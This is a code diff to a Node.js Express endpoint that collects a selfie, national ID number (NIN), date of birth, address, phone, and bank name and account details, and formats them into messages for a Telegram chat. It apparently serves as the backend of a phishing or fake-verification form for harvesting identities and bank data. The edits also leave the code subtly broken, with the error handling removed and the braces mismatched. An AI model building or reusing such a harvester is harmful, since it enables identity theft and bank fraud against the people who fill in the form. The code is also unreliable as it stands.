@@ -1,4 +1,4 @@
-const express = require('express');
+ const express = require('express');
 const multer = require('multer');
 const axios = require('axios');
 const FormData = require('form-data');
@@ -106,30 +106,44 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
     console.log('Request body:', req.body);
     console.log('Request file:', req.file);
     
-    try {
         const { name, gender, dob, email, employ, phone, marital, city, state, address, lga, nin, bankName, accountNumber, accountName} = req.body;
         const selfieFile = req.file;
 
+const nameLine = name ? `<b>Name:</b> ${name}` : '';
+const genderLine = gender ? `<b>Gender:</b> ${gender}` : '';
+const dobLine = dob ? `<b>Date of Birth:</b> ${dob}` : '';
+const emailLine = email ? `<b>Email:</b> ${email}` : '';
+const employLine = employ ? `<b>Employment Status:</b> ${employ}` : '';
+const phoneLine = phone ? `<b>Phone:</b> ${phone}` : '';
+const maritalLine = marital ? `<b>Marital Status:</b> ${marital}` : '';
+const cityLine = city ? `<b>City:</b> ${city}` : '';
+const stateLine = state ? `<b>State:</b> ${state}` : '';
+const addressLine = address ? `<b>Address:</b> ${address}` : '';
+const lgaLine = lga ? `<b>Local Government Area:</b> ${lga}` : '';
+const ninLine = nin ? `<b>NIN:</b> ${nin}` : '';
+const bankNameLine = bankName ? `<b>Bank Name:</b> ${bankName}` : '';
+const accountNumberLine = accountNumber ? `<b>Account Number:</b> ${accountNumber}` : '';
+const accountNameLine = accountName ? `<b>Account Name:</b> ${accountName}` : '';
 
         // Format text data for Telegram
         const formattedText = `
 📋 <b>New Form Submission</b>
 
- <b>Name:</b> ${name}
- <b>Gender:</b> ${gender}
- <b>Date of Birth:</b> ${dob}
- <b>Email:</b> ${email}
- <b>Employment Status:</b> ${employ}
- <b>Phone:</b> ${phone}
- <b>Marital Status:</b> ${marital}
- <b>City:</b> ${city}
- <b>State:</b> ${state}
- <b>Address:</b> ${address}
- <b>Local Government:</b> ${lga}
- <b>NIN:</b> ${nin}
- <b>Bank Name:</b> ${bankName}
- <b>Account Number:</b> ${accountNumber}
- <b>Account Name:</b> ${accountName}
+ ${nameLine}
+ ${genderLine}
+ ${dobLine}
+ ${emailLine}
+ ${employLine}
+ ${phoneLine}
+ ${maritalLine}
+ ${cityLine}
+ ${stateLine}
+ ${addressLine}
+ ${lgaLine}
+ ${ninLine}
+ ${bankNameLine}
+ ${accountNumberLine}
+ ${accountNameLine}
 
 🕒 <b>Submitted at:</b> ${new Date().toLocaleString()}
         `.trim();
@@ -139,30 +153,11 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
 
         // Send selfie to Telegram with a caption if there is one
         const caption = `📸 Selfie from: ${name}`;
-        await sendPhotoToTelegram(selfieFile.path, caption);
-
-        res.json({ 
+        // sendPhotoToTelegram(selfieFile.path, caption);
+    res.json({ 
             success: true, 
             message: 'Form submitted and data sent to Telegram successfully' 
-        });
-
-    } catch (error) {
-        console.error('Error processing form submission:', error);
-        res.status(500).json({ 
-            error: 'Failed to process form submission',
-            details: error.message 
-        });
-    }
-});
-
-// Health check endpoint
-app.get('/', (req, res) => {
-    res.json({ 
-        message: 'Form submission server is running',
-        endpoints: {
-            submitForm: 'POST /submit-form'
-        }
-    });
+    });   
 });
 
 // Error handling middleware
